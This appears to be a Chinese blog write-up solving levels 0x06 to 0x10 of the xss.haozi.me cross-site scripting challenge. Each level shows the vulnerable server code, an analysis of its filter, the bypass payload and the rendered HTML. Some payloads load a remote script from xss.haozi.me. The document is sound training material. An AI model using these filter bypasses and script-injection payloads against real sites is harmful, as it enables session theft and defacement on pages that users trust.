+<h1 id="0x06"><a href="#0x06" class="headerlink" title="0x06"></a>0x06</h1><h2 id="server-code-6"><a href="#server-code-6" class="headerlink" title="server code:"></a>server code:</h2><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> <span class="params">(input)</span></span> &#123;</span><br><span class="line">  <span class="built_in">input</span> = <span class="built_in">input</span>.replace(/auto|on.*=|&gt;/ig, <span class="string">'_'</span>)</span><br><span class="line">  <span class="keyword">return</span> `&lt;<span class="built_in">input</span> value=<span class="number">1</span> $&#123;<span class="built_in">input</span>&#125; <span class="built_in">type</span>=<span class="string">"text"</span>&gt;`</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="分析-6"><a href="#分析-6" class="headerlink" title="分析:"></a>分析:</h2><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">过滤&gt;和以auto开头或者<span class="keyword">on</span>开头，=等号结尾的标签属性并替换成<span class="title">_</span>，且忽略大小写；</span><br><span class="line"></span><br><span class="line"><span class="number">1.</span> 可以先定义type=<span class="string">'image'</span>,等价于img标签的方法了。 然后利用换行使=与onerror隔开</span><br><span class="line"><span class="number">2.</span> 用<span class="keyword">on</span>开头的触发事件</span><br></pre></td></tr></table></figure>
+
+<h2 id="input-code-6"><a href="#input-code-6" class="headerlink" title="input code:"></a>input code:</h2><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>. </span><br><span class="line"><span class="built_in">type</span>='image' src='' onerror</span><br><span class="line">=alert(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="number">2</span>.onmouseover</span><br><span class="line">=alert(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
+
+<h2 id="html-6"><a href="#html-6" class="headerlink" title="html:"></a>html:</h2><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>. &lt;input <span class="built_in">value</span>=<span class="number">1</span> <span class="built_in">type</span>='image' src='' onerror</span><br><span class="line">=alert(<span class="number">1</span>) <span class="built_in">type</span>=<span class="string">"text"</span>&gt;</span><br><span class="line"><span class="number">2</span>.&lt;input <span class="built_in">value</span>=<span class="number">1</span> onmouseover</span><br><span class="line">=alert(<span class="number">1</span>) <span class="built_in">type</span>=<span class="string">"text"</span>&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/xss/haozi/006.png" alt="006"></p>
+<h1 id="0x07"><a href="#0x07" class="headerlink" title="0x07"></a>0x07</h1><h2 id="server-code-7"><a href="#server-code-7" class="headerlink" title="server code:"></a>server code:</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> stripTagsRe = <span class="regexp">/&lt;\/?[^&gt;]+&gt;/gi</span></span><br><span class="line"></span><br><span class="line">  input = input.replace(stripTagsRe, <span class="string">''</span>)</span><br><span class="line">  <span class="keyword">return</span> <span class="string">`&lt;article&gt;<span class="subst">$&#123;input&#125;</span>&lt;/article&gt;`</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="分析-7"><a href="#分析-7" class="headerlink" title="分析:"></a>分析:</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">过滤了<span class="tag">&lt;&gt;</span>包含的所有内容并替换成空,利用浏览器兼容性绕过</span><br></pre></td></tr></table></figure>
+
+<h2 id="input-code-7"><a href="#input-code-7" class="headerlink" title="input code:"></a>input code:</h2><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>. </span><br><span class="line">&lt;<span class="selector-tag">img</span> src=<span class="string">''</span> onerror=alert`<span class="number">1</span>`</span><br><span class="line">     <span class="comment">//这里有个换行</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="html-7"><a href="#html-7" class="headerlink" title="html:"></a>html:</h2><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>. &lt;input <span class="built_in">value</span>=<span class="number">1</span> <span class="built_in">type</span>='image' src='' onerror</span><br><span class="line">=alert(<span class="number">1</span>) <span class="built_in">type</span>=<span class="string">"text"</span>&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/xss/haozi/007.png" alt="007"></p>
+<h1 id="0x08"><a href="#0x08" class="headerlink" title="0x08"></a>0x08</h1><h2 id="server-code-8"><a href="#server-code-8" class="headerlink" title="server code:"></a>server code:</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">src</span>) </span>&#123;</span><br><span class="line">  src = src.replace(<span class="regexp">/&lt;\/style&gt;/ig</span>, <span class="string">'/* \u574F\u4EBA */'</span>)</span><br><span class="line">  <span class="keyword">return</span> <span class="string">`</span></span><br><span class="line"><span class="string">    &lt;style&gt;</span></span><br><span class="line"><span class="string">      <span class="subst">$&#123;src&#125;</span></span></span><br><span class="line"><span class="string">    &lt;/style&gt;</span></span><br><span class="line"><span class="string">  `</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="分析-8"><a href="#分析-8" class="headerlink" title="分析:"></a>分析:</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">过滤了<span class="tag">&lt;/<span class="name">style</span>&gt;</span>的大小写。如果输入了<span class="tag">&lt;/<span class="name">style</span>&gt;</span>会被替换成/* 坏人 */。通过换行绕过<span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="undefined">即可。</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="input-code-8"><a href="#input-code-8" class="headerlink" title="input code:"></a>input code:</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1. </span><br><span class="line"><span class="tag">&lt;/<span class="name">style</span></span></span><br><span class="line"><span class="tag">       &gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">''</span> <span class="attr">onerror</span>=<span class="string">alert</span>`<span class="attr">1</span>`&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="html-8"><a href="#html-8" class="headerlink" title="html:"></a>html:</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1. <span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">      &lt;/style</span></span><br><span class="line"><span class="xml">       &gt;<span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">''</span> <span class="attr">onerror</span>=<span class="string">alert</span>`<span class="attr">1</span>`&gt;</span></span></span><br><span class="line"><span class="undefined">    </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/xss/haozi/008.png" alt="008"></p>
+<h1 id="0x09"><a href="#0x09" class="headerlink" title="0x09"></a>0x09</h1><h2 id="server-code-9"><a href="#server-code-9" class="headerlink" title="server code:"></a>server code:</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> domainRe = <span class="regexp">/^https?:\/\/www\.segmentfault\.com/</span></span><br><span class="line">  <span class="keyword">if</span> (domainRe.test(input)) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">`&lt;script src="<span class="subst">$&#123;input&#125;</span>"&gt;&lt;/script&gt;`</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">'Invalid URL'</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="分析-9"><a href="#分析-9" class="headerlink" title="分析:"></a>分析:</h2><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">用正则表达式匹配<span class="symbol">'https</span>(http):<span class="comment">//www.segmentfault.com',构造闭合即可。</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="input-code-9"><a href="#input-code-9" class="headerlink" title="input code:"></a>input code:</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1. </span><br><span class="line">https://www.segmentfault.com"&gt;<span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">alert(1)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="html-9"><a href="#html-9" class="headerlink" title="html:"></a>html:</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1. <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"https://www.segmentfault.com"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">alert(1)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>"&gt;<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/xss/haozi/009.png" alt="009"></p>
+<h1 id="0x0A"><a href="#0x0A" class="headerlink" title="0x0A"></a>0x0A</h1><h2 id="server-code-10"><a href="#server-code-10" class="headerlink" title="server code:"></a>server code:</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">escapeHtml</span>(<span class="params">s</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> s.replace(<span class="regexp">/&amp;/g</span>, <span class="string">'&amp;amp;'</span>)</span><br><span class="line">            .replace(<span class="regexp">/'/g</span>, <span class="string">'&amp;#39;'</span>)</span><br><span class="line">            .replace(<span class="regexp">/"/g</span>, <span class="string">'&amp;quot;'</span>)</span><br><span class="line">            .replace(<span class="regexp">/&lt;/g</span>, <span class="string">'&amp;lt;'</span>)</span><br><span class="line">            .replace(<span class="regexp">/&gt;/g</span>, <span class="string">'&amp;gt;'</span>)</span><br><span class="line">            .replace(<span class="regexp">/\//g</span>, <span class="string">'&amp;#x2f'</span>)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> domainRe = <span class="regexp">/^https?:\/\/www\.segmentfault\.com/</span></span><br><span class="line">  <span class="keyword">if</span> (domainRe.test(input)) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">`&lt;script src="<span class="subst">$&#123;escapeHtml(input)&#125;</span>"&gt;&lt;/script&gt;`</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">'Invalid URL'</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="分析-10"><a href="#分析-10" class="headerlink" title="分析:"></a>分析:</h2><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">用正则表达式匹配'https(http)://www.segmentfault.com',用html实体替换<span class="meta">&amp;'"&lt;&gt;\。</span></span><br><span class="line"><span class="number">1</span>.利用url中的@引用js</span><br><span class="line"><span class="number">2</span>.直接在给定的网址https:<span class="comment">//www.segmentfault.com 注册账号，新建一个笔记，内容为alert(1)，再调用这个笔记链接即可，需要换行</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="input-code-10"><a href="#input-code-10" class="headerlink" title="input code:"></a>input code:</h2><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span> <span class="string">https:</span><span class="comment">//www.segmentfault.com@xss.haozi.me/j.js</span></span><br><span class="line"><span class="number">2.</span> <span class="string">https:</span><span class="comment">//www.segmentfault.com/n/</span></span><br><span class="line"><span class="number">1330000016631643</span>/raw （这一行换行）</span><br></pre></td></tr></table></figure>
+
+<h2 id="html-10"><a href="#html-10" class="headerlink" title="html:"></a>html:</h2><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span> &lt;script src=<span class="string">"https:&amp;<span class="subst">#x2f</span>&amp;<span class="subst">#x2fwww</span>.segmentfault.com@xss.haozi.me&amp;<span class="subst">#x2fj</span>.js"</span>&gt;&lt;/script&gt;</span><br><span class="line"><span class="number">2.</span> &lt;script src=<span class="string">"https:&amp;<span class="subst">#x2f</span>&amp;<span class="subst">#x2fwww</span>.segmentfault.com&amp;<span class="subst">#x2fn</span>&amp;<span class="subst">#x2f</span></span></span><br><span class="line"><span class="string">1330000016631643&amp;<span class="subst">#x2fraw</span>"</span>&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/xss/haozi/00A.png" alt="00A"></p>
+<h1 id="0x0B"><a href="#0x0B" class="headerlink" title="0x0B"></a>0x0B</h1><h2 id="server-code-11"><a href="#server-code-11" class="headerlink" title="server code:"></a>server code:</h2><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> <span class="params">(input)</span></span> &#123;</span><br><span class="line">  <span class="built_in">input</span> = <span class="built_in">input</span>.toUpperCase()</span><br><span class="line">  <span class="keyword">return</span> `&lt;h1&gt;$&#123;<span class="built_in">input</span>&#125;&lt;/h1&gt;`</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="分析-11"><a href="#分析-11" class="headerlink" title="分析:"></a>分析:</h2><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">将输入的数据用toUpperCase进行了大写转换。可以利用<span class="selector-tag">html</span> 标签, 域名 不区分大小写的方式来攻克。</span><br><span class="line"><span class="number">1</span>.引用外部链接解决</span><br></pre></td></tr></table></figure>
+
+<h2 id="input-code-11"><a href="#input-code-11" class="headerlink" title="input code:"></a>input code:</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1. </span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"https://xss.haozi.me/j.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="html-11"><a href="#html-11" class="headerlink" title="html:"></a>html:</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1. <span class="tag">&lt;<span class="name">h1</span>&gt;</span><span class="tag">&lt;<span class="name">SCRIPT</span> <span class="attr">SRC</span>=<span class="string">"HTTPS://XSS.HAOZI.ME/J.JS"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">SCRIPT</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/xss/haozi/00B.png" alt="00B"></p>
+<h1 id="0x0C"><a href="#0x0C" class="headerlink" title="0x0C"></a>0x0C</h1><h2 id="server-code-12"><a href="#server-code-12" class="headerlink" title="server code:"></a>server code:</h2><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">function render (input) &#123;</span><br><span class="line">  <span class="selector-tag">input</span> = <span class="selector-tag">input</span>.replace(/script/ig, <span class="string">''</span>)</span><br><span class="line">  <span class="selector-tag">input</span> = <span class="selector-tag">input</span>.toUpperCase()</span><br><span class="line">  return <span class="string">'&lt;h1&gt;'</span> + <span class="selector-tag">input</span> + <span class="string">'&lt;/h1&gt;'</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="分析-12"><a href="#分析-12" class="headerlink" title="分析:"></a>分析:</h2><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">首先将<span class="keyword">script</span>不论大小写用空替换,并将输入的数据用toUpperCase进行了大写转换。绕过<span class="keyword">script</span>过滤后利用html 标签, 域名 不区分大小写的方式来攻克。</span><br><span class="line"><span class="number">1.</span>引用外部链接解决</span><br></pre></td></tr></table></figure>
+
+<h2 id="input-code-12"><a href="#input-code-12" class="headerlink" title="input code:"></a>input code:</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1. <span class="tag">&lt;<span class="name">scscriptript</span> <span class="attr">src</span>=<span class="string">"https://xss.haozi.me/j.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">scscriptript</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="html-12"><a href="#html-12" class="headerlink" title="html:"></a>html:</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1. <span class="tag">&lt;<span class="name">h1</span>&gt;</span><span class="tag">&lt;<span class="name">SCRIPT</span> <span class="attr">SRC</span>=<span class="string">"HTTPS://XSS.HAOZI.ME/J.JS"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">SCRIPT</span>&gt;</span><span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/xss/haozi/00C.png" alt="00C"></p>
+<h1 id="0x0D"><a href="#0x0D" class="headerlink" title="0x0D"></a>0x0D</h1><h2 id="server-code-13"><a href="#server-code-13" class="headerlink" title="server code:"></a>server code:</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  input = input.replace(<span class="regexp">/[&lt;/"']/g</span>, <span class="string">''</span>)</span><br><span class="line">  <span class="keyword">return</span> <span class="string">`</span></span><br><span class="line"><span class="string">    &lt;script&gt;</span></span><br><span class="line"><span class="string">          // alert('<span class="subst">$&#123;input&#125;</span>')</span></span><br><span class="line"><span class="string">    &lt;/script&gt;</span></span><br><span class="line"><span class="string">  `</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="分析-13"><a href="#分析-13" class="headerlink" title="分析:"></a>分析:</h2><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">过滤了&lt;<span class="regexp">/"',并用/</span>/单行注释,但是可以换行绕过过滤,使用html注释<span class="function">--&gt;</span>来注释后面的js，使代码正常运行。</span><br></pre></td></tr></table></figure>
+
+<h2 id="input-code-13"><a href="#input-code-13" class="headerlink" title="input code:"></a>input code:</h2><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>.</span><br><span class="line"><span class="comment">//这一行换行</span></span><br><span class="line"><span class="function"><span class="title">alert</span><span class="params">(`<span class="number">1</span>`)</span></span></span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="html-13"><a href="#html-13" class="headerlink" title="html:"></a>html:</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1. </span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="actionscript">          <span class="comment">// alert('</span></span></span><br><span class="line"><span class="javascript">alert(<span class="string">`1`</span>)</span></span><br><span class="line"><span class="undefined">--&gt;')</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/xss/haozi/00D.png" alt="00D"></p>
+<h1 id="0x0E"><a href="#0x0E" class="headerlink" title="0x0E"></a>0x0E</h1><h2 id="server-code-14"><a href="#server-code-14" class="headerlink" title="server code:"></a>server code:</h2><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">function render (input) &#123;</span><br><span class="line">  <span class="selector-tag">input</span> = <span class="selector-tag">input</span>.replace(/&lt;([a-zA-Z])/g, <span class="string">'&lt;_$1'</span>)</span><br><span class="line">  <span class="selector-tag">input</span> = <span class="selector-tag">input</span>.toUpperCase()</span><br><span class="line">  return <span class="string">'&lt;h1&gt;'</span> + <span class="selector-tag">input</span> + <span class="string">'&lt;/h1&gt;'</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="分析-14"><a href="#分析-14" class="headerlink" title="分析:"></a>分析:</h2><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">将&lt;后的第一个字符变成了<span class="number">_</span>字符,导致<span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">变成</span></span><span class="xml"><span class="handlebars"><span class="xml"><span class="tag">&lt;<span class="name">_script</span>&gt;</span>,有个特殊ſ 字符,是古英语中的s的写法, 转成大写是正常的S。</span></span></span></span><br></pre></td></tr></table></figure>
+
+<h2 id="input-code-14"><a href="#input-code-14" class="headerlink" title="input code:"></a>input code:</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1.<span class="tag">&lt;<span class="name">ſcript</span> <span class="attr">src</span>=<span class="string">"https://xss.haozi.me/j.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="html-14"><a href="#html-14" class="headerlink" title="html:"></a>html:</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1. <span class="tag">&lt;<span class="name">h1</span>&gt;</span><span class="tag">&lt;<span class="name">SCRIPT</span> <span class="attr">SRC</span>=<span class="string">"HTTPS://XSS.HAOZI.ME/J.JS"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">SCRIPT</span>&gt;</span><span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/xss/haozi/00E.png" alt="00E"></p>
+<h1 id="0x0F"><a href="#0x0F" class="headerlink" title="0x0F"></a>0x0F</h1><h2 id="server-code-15"><a href="#server-code-15" class="headerlink" title="server code:"></a>server code:</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">escapeHtml</span>(<span class="params">s</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> s.replace(<span class="regexp">/&amp;/g</span>, <span class="string">'&amp;amp;'</span>)</span><br><span class="line">            .replace(<span class="regexp">/'/g</span>, <span class="string">'&amp;#39;'</span>)</span><br><span class="line">            .replace(<span class="regexp">/"/g</span>, <span class="string">'&amp;quot;'</span>)</span><br><span class="line">            .replace(<span class="regexp">/&lt;/g</span>, <span class="string">'&amp;lt;'</span>)</span><br><span class="line">            .replace(<span class="regexp">/&gt;/g</span>, <span class="string">'&amp;gt;'</span>)</span><br><span class="line">            .replace(<span class="regexp">/\//g</span>, <span class="string">'&amp;#x2f;'</span>)</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">`&lt;img src onerror="console.error('<span class="subst">$&#123;escapeHtml(input)&#125;</span>')"&gt;`</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="分析-15"><a href="#分析-15" class="headerlink" title="分析:"></a>分析:</h2><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">对<span class="selector-tag">html</span> inline js 转义就是做无用功，浏览器会先解析<span class="selector-tag">html</span>, 然后再解析 js。构造闭合就行。</span><br></pre></td></tr></table></figure>
+
+<h2 id="input-code-15"><a href="#input-code-15" class="headerlink" title="input code:"></a>input code:</h2><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span>');alert('<span class="number">1</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="html-15"><a href="#html-15" class="headerlink" title="html:"></a>html:</h2><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1. &lt;img src <span class="attribute">onerror</span>=<span class="string">"console.error('&amp;#39;);alert(&amp;#39;1')"</span>&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/xss/haozi/00F.png" alt="00F"></p>
+<h1 id="0x10"><a href="#0x10" class="headerlink" title="0x10"></a>0x10</h1><h2 id="server-code-16"><a href="#server-code-16" class="headerlink" title="server code:"></a>server code:</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">`</span></span><br><span class="line"><span class="string">&lt;script&gt;</span></span><br><span class="line"><span class="string">  window.data = <span class="subst">$&#123;input&#125;</span></span></span><br><span class="line"><span class="string">&lt;/script&gt;</span></span><br><span class="line"><span class="string">  `</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="分析-16"><a href="#分析-16" class="headerlink" title="分析:"></a>分析:</h2><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">用；拆分加上alert<span class="comment">(1)</span>就行。</span><br></pre></td></tr></table></figure>
+
+<h2 id="input-code-16"><a href="#input-code-16" class="headerlink" title="input code:"></a>input code:</h2><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span> <span class="number">123</span>;alert(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
+
